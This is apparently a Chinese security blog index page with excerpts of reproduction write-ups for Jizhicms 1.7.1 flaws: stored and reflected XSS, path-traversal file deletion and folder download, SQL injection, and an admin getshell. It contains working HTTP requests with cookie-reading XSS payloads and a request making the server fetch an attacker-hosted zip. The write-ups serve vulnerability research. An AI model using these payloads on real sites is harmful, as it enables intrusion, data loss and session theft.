<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/67/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Jizhicms/Jizhicms 1.7.1 存储XSS漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:58.059Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jizhicms-1-7-1-存储XSS漏洞"><a href="#Jizhicms-1-7-1-存储XSS漏洞" class="headerlink" title="Jizhicms 1.7.1 存储XSS漏洞"></a>Jizhicms 1.7.1 存储XSS漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jizhicms 1.7.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先自己注册一个账户然后登陆，在文章标题处插入XSS payload</p>
<pre><code>payload:&lt;details open&gt;
</code></pre>
<p><img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
<p>管理员登录后台点击编辑且没有修改里面的字符串就保存的话那便会触发XSS漏洞<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"><img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="3.png">首先看一下在前台发表文章处的请求数据包</p>
<pre><code>POST /user/release.html HTTP/1.1
Host: www.0-sec.org:8091
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 187
Origin: http://www.0-sec.org:8091
Connection: close
Referer: http://www.0-sec.org:8091/user/release.html
Cookie: PHPSESSID=t616fln4me32an09rj6v67vr5b

ajax=1&amp;isshow=&amp;molds=article&amp;tid=2&amp;title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&amp;keywords=&amp;litpic=&amp;description=123&amp;body=%3Cp%3E123%3Cbr%2F%3E%3C%2Fp%3E
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrk2009oy8v14e7dfxqu" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jizhicms/Jizhicms 1.7.1 后台配置文件删除" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="article-date">
  <time datetime="2022-07-08T06:25:58.057Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jizhicms-1-7-1-后台配置文件删除"><a href="#Jizhicms-1-7-1-后台配置文件删除" class="headerlink" title="Jizhicms 1.7.1 后台配置文件删除"></a>Jizhicms 1.7.1 后台配置文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>该漏洞的触发同样也是源于frparam函数没有对传入的文件路径进行必要的过滤在<br>/A/c/PluginsController.php中的action_do函数中的483到494行中由于未对目录进行限制导致的目录穿越漏洞，只要文件中包含config.php文件即可触发deldir函数进行文件删除操作Conf文件夹中包含config.php，该文件夹为网站配置信息储存的地方，一旦被删除，网站将无法正常运行<img src="/resource/Jizhicms1.7.1%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId24.png" alt="3.png">deldir函数的功能是遍历目标文件下的所有文件进行删除操作</p>
<pre><code>function deldir($dir) &#123;
    //先删除目录下的文件：
    $dh=opendir($dir);
    while ($file=readdir($dh)) &#123;
        if($file!=&quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) &#123;
            $fullpath=$dir.&quot;/&quot;.$file;
            if(!is_dir($fullpath)) &#123;
                unlink($fullpath);
            &#125; else &#123;
                deldir($fullpath);
            &#125;
        &#125;
    &#125;
    closedir($dh);
</code></pre>
<p>成功删除了Conf文件夹<img src="/resource/Jizhicms1.7.1%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId25.png" alt="4.png"></p>
<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7775/#toc-3">https://xz.aliyun.com/t/7775\#toc-3</a></p>
</blockquote>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" data-id="cl5c2qrk1009ly8v19jbhepmz" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jizhicms/Jizhicms 1.7.1 后台任意文件夹压缩下载" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%A4%B9%E5%8E%8B%E7%BC%A9%E4%B8%8B%E8%BD%BD/" class="article-date">
  <time datetime="2022-07-08T06:25:58.055Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jizhicms-1-7-1-后台任意文件夹压缩下载"><a href="#Jizhicms-1-7-1-后台任意文件夹压缩下载" class="headerlink" title="Jizhicms 1.7.1 后台任意文件夹压缩下载"></a>Jizhicms 1.7.1 后台任意文件夹压缩下载</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jizhicms 1.7.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个的漏洞触发同样位于CMS的插件部分,只需要替换filepath的值为要打包的文件夹即可打包网站下载<img src="/resource/Jizhicms1.7.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%A4%B9%E5%8E%8B%E7%BC%A9%E4%B8%8B%E8%BD%BD/media/rId24.png" alt="1.png">根据url定位到漏洞位置，位于/A/c/PluginsController.php中的output函数，该函数主要是获取用户输入的文件名然后进行压缩在发送给客户端,还是这个frparam函数，由前文可知该函数没有对传入的参数进行过滤的话，从而导致了可以进行目录穿越，然后可以压缩不同的目录下载任意文件，条件只需要知道文件夹名字<img src="/resource/Jizhicms1.7.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%A4%B9%E5%8E%8B%E7%BC%A9%E4%B8%8B%E8%BD%BD/media/rId25.png" alt="2.png"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7775/#toc-3">https://xz.aliyun.com/t/7775\#toc-3</a></p>
</blockquote>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%A4%B9%E5%8E%8B%E7%BC%A9%E4%B8%8B%E8%BD%BD/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%A4%B9%E5%8E%8B%E7%BC%A9%E4%B8%8B%E8%BD%BD/" data-id="cl5c2qrk2009my8v1agsc3f6c" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jizhicms/Jizhicms 1.7.1 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
  <time datetime="2022-07-08T06:25:58.053Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jizhicms-1-7-1-后台getshell"><a href="#Jizhicms-1-7-1-后台getshell" class="headerlink" title="Jizhicms 1.7.1 后台getshell"></a>Jizhicms 1.7.1 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jizhicms 1.7.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>POST /admin.php/Plugins/update.html HTTP/1.1
Host: www.0-sec.org:8091
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 80
Origin: http://www.0-sec.org:8091
Connection: close
Referer: http://www.0-sec.org:8091/admin.php/Plugins/
Cookie: PHPSESSID=tq79jo8omp5s72lq101noj48lq

action=start-download&amp;filepath=msgphone&amp;download_url=http://www.0-sec.org/test/a.zip
</code></pre>
<p>攻击者可以控制download_url传入参数的值，从而传入被压缩的可执行脚本，然后该压缩包会被解压并传入到特定位置，实现getshell所以只需要攻击者在自己控制的网站上压缩可执行脚本然后将url赋值给download_url即可实现任意文件上传定位下函数位置，该函数位于/A/c/PluginsController.php下的update函数<img src="/resource/Jizhicms1.7.1%E5%90%8E%E5%8F%B0getshell/media/rId24.png" alt="1.png">传进来的值通过frparam函数处理之后变赋值给了remote_url跟进到frparam函数函数中，该函数位于/FrPHP/lib/Controller.php中</p>
<pre><code>public function frparam($str=null, $int=0,$default = FALSE, $method = null)&#123;

        $data = $this-&gt;_data;
        if($str===null) return $data;
        if(!array_key_exists($str,$data))&#123;
            return ($default===FALSE)?false:$default;
        &#125;
        if($method===null)&#123;
            $value = $data[$str];
        &#125;else&#123;
            $method = strtolower($method);
            switch($method)&#123;
                case &#39;get&#39;:
                $value = $_GET[$str];
                break;
                case &#39;post&#39;:
                $value = $_POST[$str];
                break;
                case &#39;cookie&#39;:
                $value = $_COOKIE[$str];
                break;
            &#125;
        &#125;
        return format_param($value,$int);
    &#125;
</code></pre>
<p>该函数并没有对传入的值进行过滤，只是简单的从data数组里取数据然后继续回到update函数，在获取到了remote_url的值后便进行了下载以及解压缩的操作<img src="/resource/Jizhicms1.7.1%E5%90%8E%E5%8F%B0getshell/media/rId25.png" alt="2.png"><img src="/resource/Jizhicms1.7.1%E5%90%8E%E5%8F%B0getshell/media/rId26.png" alt="3.png">最后解压到的文件夹为/A/exts<img src="/resource/Jizhicms1.7.1%E5%90%8E%E5%8F%B0getshell/media/rId27.png" alt="4.png"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0getshell/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qrk1009ky8v15bqr4005" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jizhicms/Jizhicms 1.7.1 反射型xss" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="article-date">
  <time datetime="2022-07-08T06:25:58.050Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jizhicms-1-7-1-反射型xss"><a href="#Jizhicms-1-7-1-反射型xss" class="headerlink" title="Jizhicms 1.7.1 反射型xss"></a>Jizhicms 1.7.1 反射型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jizhicms 1.7.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>https://wiki.0-sec.org/img/1&#39;%3Cimg%20src=1%20onerror=alert(1)%3E--
</code></pre>
<p><img src="/resource/Jizhicms1.7.1%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/media/rId24.png" alt="9.png"></p>
<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7775/#toc-2">https://xz.aliyun.com/t/7775\#toc-2</a></p>
</blockquote>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" data-id="cl5c2qrk1009jy8v1259q13ms" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jizhicms/Jizhicms 1.7.1 从sql注入到任意文件上传" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
  <time datetime="2022-07-08T06:25:58.047Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jizhicms-1-7-1-从sql注入到任意文件上传"><a href="#Jizhicms-1-7-1-从sql注入到任意文件上传" class="headerlink" title="Jizhicms 1.7.1 从sql注入到任意文件上传"></a>Jizhicms 1.7.1 从sql注入到任意文件上传</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jizhicms 1.7.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>从回显可以明确的看到这是一个报错注入，如果没有回显报错的话，为了查看是否进行了sql语句的拼接可以去查看mysql的log日志,可以通过Navicat的日志功能去查看<img src="/resource/Jizhicms1.7.1%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/media/rId24.png" alt="1.png">在对CMS不是很熟悉的情况下可以通过搜索关键字来定位大概的漏洞位置，customurl成功的引起了我的注意，这是表的名字，经过简单判断，定位到函数位置为/Home/c/HomeController.php中342-355行中，用户传入参数url然后进入到find函数中处理<img src="/resource/Jizhicms1.7.1%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/media/rId25.png" alt="2.png">跟进到find函数中，位于/FrPHP/lib/Model.php，find函数主要去调用findAll函数去拼接执行sql语句</p>
<pre><code>public function find($where=null,$order=null,$fields=null,$limit=1)
    &#123;
       if( $record = $this-&gt;findAll($where, $order, $fields, 1) )&#123;
            return array_pop($record);
        &#125;else&#123;
            return FALSE;
        &#125;
    &#125;
</code></pre>
<p>这里看代码看的头疼，为了直观展示代码的执行过程可以用phpstorm配合xdebug的方式去调试php代码，可以看到将我们传入的参数直接带入查询，然后调用getArray函数去执行<img src="/resource/Jizhicms1.7.1%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/media/rId26.png" alt="3.png"></p>
<pre><code>public function findAll($conditions=null,$order=null,$fields=null,$limit=null)
    &#123;
        .....
        .....
        if(!empty($limit))$where .= &quot; LIMIT &#123;$limit&#125;&quot;;
        $fields = empty($fields) ? &quot;*&quot; : $fields;
        $table = self::$table;
        $sql = &quot;SELECT &#123;$fields&#125; FROM &#123;$table&#125; &#123;$where&#125;&quot;;
        return $this-&gt;db-&gt;getArray($sql);
    &#125;
</code></pre>
<p>在 /FrPHP/db/DBholder.php中,<br>getArray函数调用query函数，如果有错误将输出错误信息<img src="/resource/Jizhicms1.7.1%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/media/rId27.png" alt="4.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cl5c2qrk0009gy8v14u5r28dk" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jizhicms/Jizhicms 1.7.1 ._user_userinfo.html sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20._user_userinfo.html%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:58.044Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jizhicms-1-7-1-user-userinfo-html-sql注入漏洞"><a href="#Jizhicms-1-7-1-user-userinfo-html-sql注入漏洞" class="headerlink" title="Jizhicms 1.7.1 ./user/userinfo.html sql注入漏洞"></a>Jizhicms 1.7.1 ./user/userinfo.html sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jizhicms 1.7.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在更改个人资料处</p>
<pre><code>POST /user/userinfo.html HTTP/1.1
Host: 127.0.0.1:8091
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Origin: http://127.0.0.1:8091
Connection: close
Referer: http://127.0.0.1:8091/user/userinfo.html
Cookie: PHPSESSID=84mcpgsvrgnfag0fnl3ngjm2eo
Upgrade-Insecure-Requests: 1

litpic=&amp;file=&amp;username=test&amp;tel=&amp;email=1%401.com&amp;sex=0&amp;province=&amp;city=&amp;address=&amp;password=&amp;repassword=&amp;signature=&amp;submit=%E6%8F%90%E4%BA%A4
</code></pre>
<p>在userinfo函数中可以看到只对tel ,pass sex<br>repass等参数进行了过滤，并不涉及province city<br>address等地址，意味着可以随意拼接sql语句触发 sql注入漏洞<img src="/resource/Jizhicms1.7.1._user_userinfo.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"><img src="/resource/Jizhicms1.7.1._user_userinfo.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png">通过mysql监控工具可以看到已经带入查询，触发了sql注入漏洞<img src="/resource/Jizhicms1.7.1._user_userinfo.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="3.png">通过sqlmap跑一下<img src="/resource/Jizhicms1.7.1._user_userinfo.htmlsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="4.png"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7861/#toc-2">https://xz.aliyun.com/t/7861\#toc-2</a></p>
</blockquote>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20._user_userinfo.html%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20._user_userinfo.html%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrk0009iy8v10p8ldt40" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jizhicms/Jizhicms 1.7.1 ._user_release.html sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20._user_release.html%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:58.042Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Jizhicms-1-7-1-user-release-html-sql注入漏洞"><a href="#Jizhicms-1-7-1-user-release-html-sql注入漏洞" class="headerlink" title="Jizhicms 1.7.1 ./user/release.html sql注入漏洞"></a>Jizhicms 1.7.1 ./user/release.html sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jizhicms 1.7.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>同样还是在发表文章这</p>
<pre><code>POST /user/release.html HTTP/1.1
Host: www.0-sec.org:8091
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 153
Origin: http://www.0-sec.org:8091
Connection: close
Referer: http://www.0-sec.org:8091/user/release/molds/article.html
Cookie: PHPSESSID=84mcpgsvrgnfag0fnl3ngjm2eo; XDEBUG_SESSION=PHPSTORM

ajax=1&amp;isshow=&amp;molds=article&amp;tid=2&amp;title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&amp;keywords=123&amp;litpic=&amp;description=123
</code></pre>
